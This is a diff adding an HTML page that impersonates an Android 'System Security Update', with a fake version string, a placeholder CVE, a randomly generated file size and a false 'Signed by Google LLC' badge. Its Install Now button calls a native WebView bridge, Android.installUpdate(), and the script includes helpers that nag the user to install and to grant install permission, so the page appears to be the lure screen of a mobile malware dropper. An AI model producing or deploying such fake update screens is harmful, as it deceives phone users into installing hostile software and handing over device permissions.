@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" />
+<title>Update Available</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}
+body{background:#f5f5f5;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}
+.card{background:#fff;border-radius:16px;padding:32px;max-width:380px;width:100%;text-align:center;box-shadow:0 2px 20px rgba(0,0,0,0.08)}
+h2{font-size:20px;color:#1a1a1a;margin-bottom:6px}
+.sub{font-size:14px;color:#666;margin-bottom:20px}
+.ucard{background:#f8f9fa;border-radius:10px;padding:14px;text-align:left;margin-bottom:16px;border:1px solid #e0e0e0}
+.uname{font-weight:600;font-size:14px;color:#1a1a1a;margin-bottom:6px}
+.usize{font-size:11px;color:#888;float:right}
+.udetail{font-size:12px;color:#555;padding:2px 0;display:flex;gap:6px}
+.udetail:before{content:'•';color:#1976d2;font-weight:bold}
+.btn{width:100%;padding:14px;border:none;border-radius:10px;font-size:16px;font-weight:600;cursor:pointer;color:#fff;background:#1976d2}
+.btn:active{background:#1565c0;transform:scale(0.98)}
+.badge{font-size:11px;color:#2e7d32;margin-top:12px;padding:6px;background:#e8f5e9;border-radius:6px;display:inline-block}
+.warn{display:none;color:#d32f2f;font-size:12px;margin-top:10px;padding:8px;background:#ffebee;border-radius:6px}
+</style>
+</head>
+<body>
+<div class="card">
+<h2>📱 System Update Available</h2>
+<p class="sub">A critical security update is available.</p>
+<div class="ucard">
+<div><span class="uname">Android Security Update</span><span class="usize" id="fsize">Calculating...</span></div>
+<div class="udetail">Version: 14.0.0 (AP1A.240605.000)</div>
+<div class="udetail">Security patch: June 2026</div>
+<div class="udetail">Critical: CVE-2026-1234</div>
+<div class="udetail">Improved system stability</div>
+</div>
+<button class="btn" id="ibtn" onclick="install()">Install Now</button>
+<div class="badge">🔒 Signed by Google LLC</div>
+<div class="warn" id="warn"></div>
+</div>
+<script>
+document.getElementById('fsize').textContent=(Math.random()*150+50).toFixed(1)+' MB';
+function install(){
+var btn=document.getElementById('ibtn');
+btn.disabled=true;btn.textContent='Preparing...';
+setTimeout(function(){
+try{Android.installUpdate();}catch(e){
+document.getElementById('warn').style.display='block';
+document.getElementById('warn').textContent='Error: '+e.message;
+btn.disabled=false;btn.textContent='Retry';
+}
+},1200);
+}
+function flashWarning(){
+var w=document.getElementById('warn');
+w.style.display='block';
+w.textContent='⚠️ Please install the update to continue';
+setTimeout(function(){w.style.display='none';},3000);
+}
+function showError(msg){
+document.getElementById('warn').style.display='block';
+document.getElementById('warn').textContent='⚠️ '+msg;
+document.getElementById('ibtn').disabled=false;
+document.getElementById('ibtn').textContent='Retry Install';
+}
+function showPermissionScreen(){
+document.getElementById('ibtn').textContent='Allow Install Permission';
+document.getElementById('ibtn').disabled=false;
+}
+</script>
+</body>
+</html>
